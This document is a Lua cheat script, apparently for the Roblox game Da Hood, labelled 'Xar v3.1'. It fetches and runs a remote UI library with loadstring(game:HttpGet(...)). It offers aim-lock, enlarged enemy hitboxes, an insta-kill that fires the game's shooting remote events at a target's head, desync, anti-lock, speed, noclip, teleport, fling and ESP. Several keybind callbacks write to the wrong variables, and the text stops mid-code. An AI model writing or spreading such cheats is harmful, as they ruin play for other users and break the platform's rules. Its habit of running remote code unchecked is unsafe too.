--// Main User-Interface \\--

local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/7ant/rayfield_ui/refs/heads/main/Rayfield_UI.txt'))()

local Window = Rayfield:CreateWindow({
       Name = "Xar | Da Hood",
    Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
    LoadingTitle = "Xar v3.1",
    LoadingSubtitle = "by @x7ant",
    Theme = "Serenity", -- Check https://docs.sirius.menu/rayfield/configuration/themes
 
    DisableRayfieldPrompts = true,
    DisableBuildWarnings = true, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
 
    ConfigurationSaving = {
       Enabled = true,
       FolderName = nil, -- Create a custom folder for your hub/game
       FileName = "XarConfig"
    },
 
    Discord = {
       Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
       Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
    },
 
    KeySystem = false, -- Set this to true to use our key system
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
       Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
       FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
       SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
       Key = {"Key"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
})

Rayfield:Notify({
   Title = "Xar | v3.1",
   Content = "Xar has successfully been loaded.",
   Duration = 7.5,
   Image = 4483362458,
})

local CombatTab = Window:CreateTab("Main", 4483362458)
local TeleportsTab = Window:CreateTab("Teleports", 4483362458)
local ConfigsTab = Window:CreateTab("Configs", 4483362458)

-- Main Tab --

local LockSection = CombatTab:CreateSection("Lock")

local Camlock = false
local Orbit = false
local InstantKill = false
local InstantKillVal = false

local CamlockToggle = CombatTab:CreateToggle({
    Name = "Cam-Lock",
    CurrentValue = false,
    Flag = "Toggle1",
    Callback = function(Value)
        Camlock = Value
    end,
})

local OrbitToggle = CombatTab:CreateToggle({
    Name = "Orbit-Lock",
    CurrentValue = false,
    Flag = "Toggle2",
    Callback = function(Value)
        Orbit = Value
    end,
})

local KillLastTargetToggle = CombatTab:CreateToggle({
    Name = "Insta-Kill Last Target",
    CurrentValue = false,
    Flag = "Toggle3",
    Callback = function(Value)
        InstantKill = Value
    end,
})

local InstaKillToggle = CombatTab:CreateToggle({
    Name = "Insta-Kill Toggle (Camlock + Orbit-Lock)",
    CurrentValue = false,
    Flag = "Toggle4",
    Callback = function(Value)
        InstantKillVal = Value
    end,
})

local SafetySection = CombatTab:CreateSection("Safety")

local AntiLock = false
local Desync = false
local Resolver = false
local AntiStomp = false
local AutoArmor = false

local AntiLockToggle = CombatTab:CreateToggle({
    Name = "Anti-Lock",
    CurrentValue = false,
    Flag = "Toggle5",
    Callback = function(Value)
        AntiLock = Value
    end,
})

local DesyncToggle = CombatTab:CreateToggle({
    Name = "Desync",
    CurrentValue = false,
    Flag = "Toggle6",
    Callback = function(Value)
        Desync = Value
    end,
})

local ResolverToggle = CombatTab:CreateToggle({
    Name = "Resolver",
    CurrentValue = false,
    Flag = "Toggle7",
    Callback = function(Value)
        Resolver = Value
    end,
})

local AntiStompToggle = CombatTab:CreateToggle({
    Name = "Anti-Stomp",
    CurrentValue = false,
    Flag = "Toggle8",
    Callback = function(Value)
        AntiStomp = Value
    end,
})

local AutoArmorToggle = CombatTab:CreateToggle({
    Name = "Auto-Armor",
    CurrentValue = false,
    Flag = "Toggle9",
    Callback = function(Value)
        AutoArmor = Value
    end,
})

local MiscSection = CombatTab:CreateSection("Misc")

local TpTarget = false
local FlingTarget = false
local Noclip = false
local ESP = false

local TpTargetToggle = CombatTab:CreateToggle({
    Name = "Teleport To Last Target",
    CurrentValue = false,
    Flag = "Toggle10",
    Callback = function(Value)
        TpTarget = Value
    end,
})

local FlingTargetToggle = CombatTab:CreateToggle({
    Name = "Fling Target",
    CurrentValue = false,
    Flag = "Toggle11",
    Callback = function(Value)
        FlingTarget = Value
    end,
})

local ResolverToggle = CombatTab:CreateToggle({
    Name = "Noclip",
    CurrentValue = false,
    Flag = "Toggle12",
    Callback = function(Value)
        Noclip = Value
    end,
})

local ResolverToggle = CombatTab:CreateToggle({
    Name = "ESP",
    CurrentValue = false,
    Flag = "Toggle13",
    Callback = function(Value)
        ESP = Value
    end,
})

-- Config Tab --

local LockConfigSection = ConfigsTab:CreateSection("Lock-Config")

-- Lock Config --

local CamKeyConfig = 'X'
local CamOffsetConfig = .15
local OrbitKeyConfig = 'V'
local OrbitHeightConfig = 25
local InsatKillConfig = 'C'
local InstaKillToggleConfig = 'J'

local CamKeyInput = ConfigsTab:CreateInput({
	Name = "Camlock Keybind",
	CurrentValue = "X",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input1",
	Callback = function(Text)
		CamKeyConfig = Text
	end,
})

local CamOffsetInput = ConfigsTab:CreateInput({
	Name = "Camlock Offset",
	CurrentValue = ".15",
	PlaceholderText = "Offset",
	RemoveTextAfterFocusLost = false,
	Flag = "Input2",
	Callback = function(Text)
		CamKeyConfig = tonumber(Text)
	end,
})

local OrbitKeyInput = ConfigsTab:CreateInput({
	Name = "Orbit-Lock Keybind",
	CurrentValue = "V",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input3",
	Callback = function(Text)
		OrbitKeyConfig = Text
	end,
})

local OrbitHeightInput = ConfigsTab:CreateInput({
	Name = "Orbit-Lock Height",
	CurrentValue = "25",
	PlaceholderText = "Height",
	RemoveTextAfterFocusLost = false,
	Flag = "Input4",
	Callback = function(Text)
		OrbitHeightConfig = tonumber(Text)
	end,
})

local InstaKillKeyInput = ConfigsTab:CreateInput({
	Name = "Insta-Kill Last Target Keybind",
	CurrentValue = "C",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input5",
	Callback = function(Text)
		OrbitKeyConfig = Text
	end,
})

local InstaKillKeyInput = ConfigsTab:CreateInput({
	Name = "Insta-Kill Toggle (Camlock + Orbit-Lock) Keybind",
	CurrentValue = "J",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input6",
	Callback = function(Text)
		OrbitKeyConfig = Text
	end,
})

-- Safety Config --

local SafetyConfigSection = ConfigsTab:CreateSection("Safety-Config")

local AntiKeyConfig = 'Y'
local DesyncKeyConfig = 'B'
local ResolverKeyConfig = 'U'

local AntiKeyInput = ConfigsTab:CreateInput({
	Name = "Anti-Lock Keybind",
	CurrentValue = "Y",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input7",
	Callback = function(Text)
		AntiKeyConfig = Text
	end,
})

local DesyncKeyInput = ConfigsTab:CreateInput({
	Name = "Desync Keybind",
	CurrentValue = "B",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input8",
	Callback = function(Text)
		DesyncKeyConfig = Text
	end,
})

local ResolverKeyInput = ConfigsTab:CreateInput({
	Name = "Resolver Keybind",
	CurrentValue = "U",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input9",
	Callback = function(Text)
		ResolverKeyConfig = Text
	end,
})

-- Misc Config --

local Speed = 2.5
local TpTargetKeyConfig = 'T'
local FlingTargetKeyConfig = 'H'
local NoclipKeyConfig = 'N'
local ESPKeyConfig = 'L'

local SpeedInput = ConfigsTab:CreateInput({
	Name = "Speed",
	CurrentValue = "2.5",
	PlaceholderText = "Speed",
	RemoveTextAfterFocusLost = false,
	Flag = "Input0",
	Callback = function(Text)
		Speed = tonumber(Text)
	end,
})

local TpTargetKeyInput = ConfigsTab:CreateInput({
	Name = "Teleport To Last Target Keybind",
	CurrentValue = "T",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input10",
	Callback = function(Text)
		ResolverKeyConfig = Text
	end,
})

local FlingTargetKeyInput = ConfigsTab:CreateInput({
	Name = "Fling Target Keybind",
	CurrentValue = "H",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input11",
	Callback = function(Text)
		FlingTargetKeyConfig = Text
	end,
})

local NoclipKeyInput = ConfigsTab:CreateInput({
	Name = "Noclip Keybind",
	CurrentValue = "N",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input12",
	Callback = function(Text)
		NoclipKeyConfig = Text
	end,
})

local ESPKeyInput = ConfigsTab:CreateInput({
	Name = "ESP Keybind",
	CurrentValue = "L",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input13",
	Callback = function(Text)
		ESPKeyConfig = Text
	end,
})

-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --

--// Main Source Script \\--

local UIS = game:GetService("UserInputService")
local Player = game:GetService("Players").LocalPlayer
local Cam = workspace.CurrentCamera
local Mouse = Player:GetMouse()
local Character = Player.Character
local V_Active = false
local X_Active = false
local Z_Active = false
local Y_Active = false
local L_Active = false
local N_Active = false
local U_Active = false
local B_Active = false
local J_Active = false
local lastTarget = ""

local Offset = .15
local Speed = true
local Height = 25
local Radius = 10

--// Code \\--

task.spawn(function()
	Player.Character:WaitForChild("BodyEffects"):WaitForChild("Movement"):FindFirstChild("NoJumping")
	Player.CharacterAdded:Connect(function(C)
		task.wait(1)
		C:WaitForChild("BodyEffects"):WaitForChild("Movement"):FindFirstChild("NoJumping")
	end)
end)

local function LockMethod(Method, Target)
	local Result
	task.spawn(
		function()
			if Method == "Velocity" then
				Result = Target.Position + Target.Velocity * CamOffsetConfig
			elseif Method == "MoveDirection" then
				Result = Target.Position + Vector3.new(0, 1, 0) + (Target.Parent.Humanoid.MoveDirection * CamOffsetConfig * Target.Parent.Humanoid.WalkSpeed)
			end
		end
	)
	return Result
end

--// Speed \--

local SpeedKeyConfig = 'Z'

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[SpeedKeyConfig] and Z_Active == false then
			task.spawn(function()
				Z_Active = true
				task.spawn(function()
					while task.wait() do
						if Z_Active == true then
							Player.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame + (Player.Character.Humanoid.MoveDirection * (Speed))
						else
							return
						end
					end
				end)
			end)
		elseif Input.KeyCode == Enum.KeyCode[SpeedKeyConfig] and Z_Active == true then
			Z_Active = false
		end
	end
)

--// Soft-Aim \--

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[CamKeyConfig] and Camlock == true then
			if X_Active == false then
				X_Active = true
				local nearestTarget = ""
				local nearestDistance = math.huge

				local Max_Distance = 125
				for i, v in ipairs(game.Players:GetPlayers()) do
					if
						v ~= Player and v.Character and v.Character:FindFirstChild("Humanoid") and
						v.Character:FindFirstChild("Humanoid").Health ~= 0
					then
						if
							v.Character:FindFirstChild("BodyEffects") ~= nil and
							v.Character.BodyEffects:FindFirstChild("K.O") ~= nil and
							v.Character.BodyEffects["K.O"].Value ~= true
						then
							if v.Character:FindFirstChild("HumanoidRootPart") then
								local TargetHRP = v.Character.HumanoidRootPart
								local mag = (Mouse.Hit.Position - TargetHRP.Position).magnitude
								if mag < nearestDistance and mag <= Max_Distance then
									nearestDistance = mag
									nearestTarget = v
								end
							end
						end
					end
				end
				if nearestTarget == "" or nearestTarget == Player then
					return
				end
				lastTarget = nearestTarget
                nearestTarget.Character.HumanoidRootPart.Size = Vector3.new(15,8,10)
				while task.wait() do
					if X_Active == true then
						pcall(
							function()
								local part = nearestTarget.Character.HumanoidRootPart
                                nearestTarget.Character.HumanoidRootPart.CanCollide = false
								if U_Active == false then
									local Calculated_Offset = LockMethod("Velocity", part)
									workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Calculated_Offset)
								else
									local Calculated_Offset = LockMethod("MoveDirection", part)
									workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Calculated_Offset)
								end
							end
						)
					else
                    nearestTarget.Character.HumanoidRootPart.Size = Vector3.new(2,2,1)
						return
					end
				end
			elseif X_Active == true then
				X_Active = false
			end
		end
	end
)

--// Insta-Kill Toggle \--

UIS.InputBegan:Connect(function(Input, IsTyping)
	if IsTyping then
		return
	end
    if Input.KeyCode == Enum.KeyCode[InstaKillToggleConfig] and InstantKillVal == true then
        J_Active = not J_Active
		Rayfield:Notify({
			Title = "Xar | Insta-Kill Toggle",
			Content = tostring(J_Active),
			Duration = 3.5,
			Image = 4483362458,
		 })
    end
end)

--// Orbit \\--

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[OrbitKeyConfig] and Orbit == true then
			if V_Active == false then
				V_Active = true

                    -- NORMAL VERSION

                    local nearestTarget = ""
                    local nearestDistance = math.huge
    
                    local Max_Distance = math.huge
                    for i, v in ipairs(game.Players:GetPlayers()) do
                        if
                            v ~= Player and v.Character and v.Character:FindFirstChild("Humanoid") and
                            v.Character:FindFirstChild("Humanoid").Health ~= 0
                        then
                            if
                                v.Character:FindFirstChild("BodyEffects") ~= nil and
                                v.Character.BodyEffects:FindFirstChild("K.O") ~= nil and
                                v.Character.BodyEffects["K.O"].Value ~= true
                            then
                                local TargetHRP = v.Character.HumanoidRootPart
                                local mag = (Mouse.Hit.Position - TargetHRP.Position).magnitude
                                if mag < nearestDistance and mag <= Max_Distance then
                                    nearestDistance = mag
                                    nearestTarget = v
                                end
                            end
                        end
                    end
                    if nearestTarget == "" or nearestTarget == Player then
                        return
                    end
                    lastTarget = nearestTarget
                    pcall(
                        function()
                            local center = nearestTarget.Character.HumanoidRootPart
                            local planet = Player.Character.HumanoidRootPart
                            local ORBIT_TIME = .1
                            local RADIUS = 5
                            local ECLIPSE = 1
                            local ROTATION = CFrame.Angles(0, 0, 0)
                            local sin, cos = math.sin, math.cos
                            local ROTSPEED = math.pi * 2 / ORBIT_TIME
                            ECLIPSE = ECLIPSE * RADIUS
                            local rot = 0
                            nearestTarget.Character.HumanoidRootPart.Size = Vector3.new(35,38,35)
                            --nearestTarget.Character.HumanoidRootPart.Transparency = 1
                            nearestTarget.Character.HumanoidRootPart.CanCollide = false
                            game:GetService("RunService").Stepped:Connect(
                            function(t, dt)
                                if V_Active == false then
                                    planet = nil
                                    center = nil
                                    if nearestTarget ~= nil and nearestTarget.Character ~= nil and nearestTarget.Character.HumanoidRootPart ~= nil then
                                    nearestTarget.Character:WaitForChild('HumanoidRootPart').Size = Vector3.new(2,2,1)
                                    end
                                    nearestTarget = ""
                                    return
                                else
                                    nearestTarget.Character.HumanoidRootPart.CanCollide = false
                                    rot = rot + dt * ROTSPEED
                                    planet.CFrame =
                                        ROTATION * CFrame.new(sin(rot) * ECLIPSE, OrbitHeightConfig, cos(rot) * RADIUS) +
                                        center.Position

                                        task.spawn(function()
                                            if J_Active == true then
                                            task.wait(.5)
    
                                            local Target = nearestTarget.Character
    
                                            local args = {
                                                [1] = "Shoot"
                                            }
                                        
                                            game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer(unpack(args))
                                        
                                            local args = {
                                                [1] = "ShootGun",
                                                [2] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle,
                                                [3] = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position,
                                                [4] = Target.Head.Position,
                                                [5] = Target.Head,
                                                [6] = Vector3.new(0, 1, 0)
                                            }
                                        
                                            game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
                                        
                                            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Revolver]").RemoteEvent:FireServer()
                                        end
                                        end)
                                end
                            end
                            )
                        end
                    )
                    while task.wait() do
                        if V_Active == true then
                            pcall(
                                function()
                                    local part = nearestTarget.Character.HumanoidRootPart
                                    if U_Active == false then
                                        local Calculated_Offset = LockMethod("Velocity", part)
                                        workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Calculated_Offset)
                                    else
                                        local Calculated_Offset = LockMethod("MoveDirection", part)
                                        workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Calculated_Offset)
                                    end
                                end
                            )
                        else
                            return
                        end
                    end
			elseif V_Active == true then
				V_Active = false
			end
		end
	end
)

--// TP \\--

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[TpTargetKeyConfig] and TpTarget == true then
			Player.Character.HumanoidRootPart.CFrame =
				lastTarget.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 1.75)
		end
	end
)

--// CFrame Desync \\--

UIS.InputBegan:Connect(function(Input,IsTyping)
	if IsTyping then
		return
	end
	if Input.KeyCode == Enum.KeyCode[DesyncKeyConfig] and B_Active == false and Desync == true then 
		B_Active = true
		Rayfield:Notify({
			Title = "Xar | Desync",
			Content = tostring(B_Active),
			Duration = 3.5,
			Image = 4483362458,
		})
		local Part
		task.spawn(function()
			Part = Instance.new("Part")
			Part.Name = "DesyncPart"
			Part.CanCollide = false
			Part.Anchored = true
			Part.Transparency = .75
			Part.Size = Vector3.new(1,1,1)
			task.spawn(function()
				while task.wait(.1) do
					if B_Active == false then break end
					Part.BrickColor = BrickColor.new("Really red")
				end
			end)
		end)
		task.wait()
		workspace.CurrentCamera.CameraSubject = Part
		task.spawn(function()
			game:GetService('RunService').Heartbeat:Connect(function()
				if B_Active ~= true then return end
				local LocalPlayer = Player
				local OldPos = LocalPlayer.Character.HumanoidRootPart.CFrame
				local Origin = LocalPlayer.Character.HumanoidRootPart
				local randomRange = Radius
				LocalPlayer.Character.HumanoidRootPart.CFrame = (CFrame.new(Origin.Position) + Vector3.new(math.random(-randomRange, randomRange), math.random(-randomRange, randomRange), math.random(-randomRange, randomRange))) * CFrame.Angles(math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)))
				game:GetService("RunService").RenderStepped:Wait()
				LocalPlayer.Character.HumanoidRootPart.CFrame = OldPos
				Part.CFrame = OldPos * CFrame.new(0,3,0)
			end)
		end)
	elseif Input.KeyCode == Enum.KeyCode[DesyncKeyConfig] and B_Active == true then
		B_Active = false
		Rayfield:Notify({
			Title = "Xar | Desync",
			Content = tostring(B_Active),
			Duration = 3.5,
			Image = 4483362458,
		})
		workspace:FindFirstChild("DesyncPart"):Destroy()
	end
end)

--// Anti-Lock \\--

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[AntiKeyConfig] and AntiLock == true then
			if Y_Active == false then
				Y_Active = true
				task.spawn(
					function()
						Rayfield:Notify({
							Title = "Xar | Anti-Lock",
							Content = tostring(Y_Active),
							Duration = 3.5,
							Image = 4483362458,
						 })
					end
				)
				task.spawn(
					function()
						game:GetService("RunService").Heartbeat:Connect(
						function()
							if Y_Active == false then
								return
							end
							if Y_Active == true then
								local RootPart = Player.Character.HumanoidRootPart
								local Velocity = RootPart.Velocity
								RootPart.Velocity = Vector3.new(Velocity.X, 9e9, Velocity.Z)
								game:GetService("RunService").RenderStepped:Wait()
								RootPart.Velocity = Velocity
							end
						end
						)
					end
				)
			elseif Y_Active == true then
				Y_Active = false
                		Rayfield:Notify({
							Title = "Xar | Anti-Lock",
							Content = tostring(Y_Active),
							Duration = 3.5,
							Image = 4483362458,
						 })
			end
		end
	end
)

--// Resolver \\--

UIS.InputBegan:Connect(function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[ResolverKeyConfig] and Resolver == true then
			if U_Active == false then
				U_Active = true
				task.spawn(
					function()
						Rayfield:Notify({
							Title = "Xar | Resolver",
							Content = tostring(U_Active),
							Duration = 3.5,
							Image = 4483362458,
						})
					end
				)
			elseif U_Active == true then
				task.spawn(
					function()
					end
				)
				U_Active = false
				Rayfield:Notify({
					Title = "Xar | Resolver",
					Content = tostring(U_Active),
					Duration = 3.5,
					Image = 4483362458,
				})
			end
		end
	end)

--// ESP \\--

UIS.InputBegan:Connect(
	function(Input, IsTyping)
		if IsTyping then
			return
		end
		if Input.KeyCode == Enum.KeyCode[ESPKeyConfig] and ESP == true then
			if L_Active == false then
				L_Active = true
				task.spawn(
					function()
						for i, v in next, game:GetService("Players"):GetPlayers() do
							if v ~= Player and v.Character ~= nil then
								task.spawn(
									function()
										if L_Active ~= true then
											return
										end

										task.spawn(
											function()
												task.wait()
												local Plr = v
												local humanoidRootPart = v.Character:WaitForChild("HumanoidRootPart")

												--// 1 \\--

												local billboardGui = Instance.new("BillboardGui")
												billboardGui.MaxDistance = 1500
												billboardGui.Name = "XarESP"
												billboardGui.AlwaysOnTop = true
												billboardGui.Size = UDim2.new(0, 100, 0, 50)
												billboardGui.StudsOffset = Vector3.new(0, 4, 0)
												billboardGui.Parent = humanoidRootPart

												local textLabel = Instance.new("TextLabel")
												textLabel.TextWrapped = false
												textLabel.Parent = billboardGui
												textLabel.Size = UDim2.new(1, 0, 1, 0)
												textLabel.BackgroundTransparency = 1
												textLabel.TextColor3 = Color3.new(1, 1, 1)
												textLabel.TextStrokeTransparency = 0.5
												textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
												textLabel.Font = Enum.Font.SourceSansBold
												textLabel.TextScaled = true
												textLabel.Text = Plr.Name

												--// 2 \\--

												local billboardGui2 = Instance.new("BillboardGui")
												billboardGui2.MaxDistance = 50
												billboardGui2.Name = "XarESP2"
												billboardGui2.AlwaysOnTop = true
												billboardGui2.Size = UDim2.new(0, 100, 0, 50)
												billboardGui2.StudsOffset = Vector3.new(0, 3.5, 0)
												billboardGui2.Parent = humanoidRootPart

												local textLabel2 = Instance.new("TextLabel")
												textLabel2.TextWrapped = false
												textLabel2.Parent = billboardGui2
												textLabel2.Size = UDim2.new(1, 0, 1, 0)
												textLabel2.BackgroundTransparency = 1
												textLabel2.TextColor3 = Color3.new(1, 1, 1)
												textLabel2.TextStrokeTransparency = 0.5
												textLabel2.TextStrokeColor3 = Color3.new(0, 0, 0)
												textLabel2.Font = Enum.Font.SourceSansBold
												textLabel2.TextSize = 20

												task.spawn(
													function()
														while task.wait(.1) do
															if L_Active ~= true then
																break
															end
															textLabel2.Text =
																"Health: " .. Plr.Character.Humanoid.Health
														end
													end
												)

												--// 3 \\--

												local billboardGui3 = Instance.new("BillboardGui")
												billboardGui3.MaxDistance = 50
												billboardGui3.Name = "XarESP3"
												billboardGui3.AlwaysOnTop = true
												billboardGui3.Size = UDim2.new(0, 100, 0, 50)
												billboardGui3.StudsOffset = Vector3.new(0, 3.25, 0)
												billboardGui3.Parent = humanoidRootPart

												local textLabel3 = Instance.new("TextLabel")
												textLabel3.TextWrapped = false
												textLabel3.Parent = billboardGui3
												textLabel3.Size = UDim2.new(1, 0, 1, 0)
												textLabel3.BackgroundTransparency = 1
												textLabel3.TextColor3 = Color3.new(1, 1, 1)
												textLabel3.TextStrokeTransparency = 0.5
												textLabel3.TextStrokeColor3 = Color3.new(0, 0, 0)
												textLabel3.Font = Enum.Font.SourceSansBold
												textLabel3.TextSize = 20

												task.spawn(
													function()
														while task.wait(.1) do
															if L_Active ~= true then
																break
															end
															textLabel3.Text =
																"Armor: " ..
																tostring(Plr.Character.BodyEffects.Armor.Value)
														end
													end
												)
											end
										)
										local Highlight = Instance.new("Highlight", v.Character)
									end
								)
								task.spawn(
									function()
										v.CharacterAdded:Connect(
											function(Char)
												if L_Active ~= true then
													return
												end
												task.spawn(
													function()
														task.wait(3.5)
														local Highlight = Instance.new("Highlight", Char)
														local Plr = v
														local humanoidRootPart = Char:WaitForChild("HumanoidRootPart")

														--// 1 \\--

														local billboardGui = Instance.new("BillboardGui")
														billboardGui.MaxDistance = 1500
														billboardGui.Name = "XarESP"
														billboardGui.AlwaysOnTop = true
														billboardGui.Size = UDim2.new(0, 100, 0, 50)
														billboardGui.StudsOffset = Vector3.new(0, 4, 0)
														billboardGui.Parent = humanoidRootPart

														local textLabel = Instance.new("TextLabel")
														textLabel.TextWrapped = false
														textLabel.Parent = billboardGui
														textLabel.Size = UDim2.new(1, 0, 1, 0)
														textLabel.BackgroundTransparency = 1
														textLabel.TextColor3 = Color3.new(1, 1, 1)
														textLabel.TextStrokeTransparency = 0.5
														textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
														textLabel.Font = Enum.Font.SourceSansBold
														textLabel.TextScaled = true
														textLabel.Text = Plr.Name

														--// 2 \\--

														local billboardGui2 = Instance.new("BillboardGui")
														billboardGui2.MaxDistance = 50
														billboardGui2.Name = "XarESP2"
														billboardGui2.AlwaysOnTop = true
														billboardGui2.Size = UDim2.new(0, 100, 0, 50)
														billboardGui2.StudsOffset = Vector3.new(0, 3.5, 0)
														billboardGui2.Parent = humanoidRootPart

														local textLabel2 = Instance.new("TextLabel")
														textLabel2.TextWrapped = false
														textLabel2.Parent = billboardGui2
														textLabel2.Size = UDim2.new(1, 0, 1, 0)
														textLabel2.BackgroundTransparency = 1
														textLabel2.TextColor3 = Color3.new(1, 1, 1)
														textLabel2.TextStrokeTransparency = 0.5
														textLabel2.TextStrokeColor3 = Color3.new(0, 0, 0)
														textLabel2.Font = Enum.Font.SourceSansBold
														textLabel2.TextSize = 20

														task.spawn(
															function()
																while task.wait(.1) do
																	if L_Active ~= true then
																		break
																	end
																	textLabel2.Text =
																		"Health: " .. Plr.Character.Humanoid.Health
																end
															end
														)

														--// 3 \\--

														local billboardGui3 = Instance.new("BillboardGui")
														billboardGui3.MaxDistance = 50
														billboardGui3.Name = "XarESP3"
														billboardGui3.AlwaysOnTop = true
														billboardGui3.Size = UDim2.new(0, 100, 0, 50)
														billboardGui3.StudsOffset = Vector3.new(0, 3.25, 0)
														billboardGui3.Parent = humanoidRootPart

														local textLabel3 = Instance.new("TextLabel")
														textLabel3.TextWrapped = false
														textLabel3.Parent = billboardGui3
														textLabel3.Size = UDim2.new(1, 0, 1, 0)
														textLabel3.BackgroundTransparency = 1
														textLabel3.TextColor3 = Color3.new(1, 1, 1)
														textLabel3.TextStrokeTransparency = 0.5
														textLabel3.TextStrokeColor3 = Color3.new(0, 0, 0)
														textLabel3.Font = Enum.Font.SourceSansBold
														textLabel3.TextSize = 20

														task.spawn(
															function()
																while task.wait(.1) do
																	if L_Active ~= true then
																		break
																	end
																	textLabel3.Text =
																		"Armor: " ..
																		tostring(Plr.Character.BodyEffects.Armor.Value)
																end
															end
														)
													end
												)
												local Highlight = Instance.new("Highlight", Char)
											end
										)
									end
								)
							end
						end
					end
				)
				task.spawn(
					function()
						game:GetService("Players").PlayerAdded:Connect(
						function(Plr)
							if L_Active ~= true then
								return
							end
							task.spawn(
								function()
									local Char = Plr.CharacterAdded:Wait()
									task.spawn(
										function()
											task.wait(3)
											local Highlight = Instance.new("Highlight", Char)
											local humanoidRootPart = Plr.Character:WaitForChild("HumanoidRootPart")

											--// 1 \\--

											local billboardGui = Instance.new("BillboardGui")
											billboardGui.MaxDistance = 1500
											billboardGui.Name = "XarESP"
											billboardGui.AlwaysOnTop = true
											billboardGui.Size = UDim2.new(0, 100, 0, 50)
											billboardGui.StudsOffset = Vector3.new(0, 4, 0)
											billboardGui.Parent = humanoidRootPart

											local textLabel = Instance.new("TextLabel")
											textLabel.TextWrapped = false
											textLabel.Parent = billboardGui
											textLabel.Size = UDim2.new(1, 0, 1, 0)
											textLabel.BackgroundTransparency = 1
											textLabel.TextColor3 = Color3.new(1, 1, 1)
											textLabel.TextStrokeTransparency = 0.5
											textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
											textLabel.Font = Enum.Font.SourceSansBold
											textLabel.TextScaled = true
											textLabel.Text = Plr.Name

											--// 2 \\--

											local billboardGui2 = Instance.new("BillboardGui")
											billboardGui2.MaxDistance = 50
											billboardGui2.Name = "XarESP2"
											billboardGui2.AlwaysOnTop = true
											billboardGui2.Size = UDim2.new(0, 100, 0, 50)
											billboardGui2.StudsOffset = Vector3.new(0, 3.5, 0)
											billboardGui2.Parent = humanoidRootPart

											local textLabel2 = Instance.new("TextLabel")
											textLabel2.TextWrapped = false
											textLabel2.Parent = billboardGui2
											textLabel2.Size = UDim2.new(1, 0, 1, 0)
											textLabel2.BackgroundTransparency = 1
											textLabel2.TextColor3 = Color3.new(1, 1, 1)
											textLabel2.TextStrokeTransparency = 0.5
											textLabel2.TextStrokeColor3 = Color3.new(0, 0, 0)
											textLabel2.Font = Enum.Font.SourceSansBold
											textLabel2.TextSize = 20

											task.spawn(
												function()
													while task.wait(.1) do
														if L_Active ~= true then
															break
														end
														textLabel2.Text =
															"Health: " .. Plr.Character.Humanoid.Health
													end
												end
											)

											--// 3 \\--

											local billboardGui3 = Instance.new("BillboardGui")
											billboardGui3.MaxDistance = 50
											billboardGui3.Name = "XarESP3"
											billboardGui3.AlwaysOnTop = true
											billboardGui3.Size = UDim2.new(0, 100, 0, 50)
											billboardGui3.StudsOffset = Vector3.new(0, 3.25, 0)
											billboardGui3.Parent = humanoidRootPart

											local textLabel3 = Instance.new("TextLabel")
											textLabel3.TextWrapped = false
											textLabel3.Parent = billboardGui3
											textLabel3.Size = UDim2.new(1, 0, 1, 0)
											textLabel3.BackgroundTransparency = 1
											textLabel3.TextColor3 = Color3.new(1, 1, 1)
											textLabel3.TextStrokeTransparency = 0.5
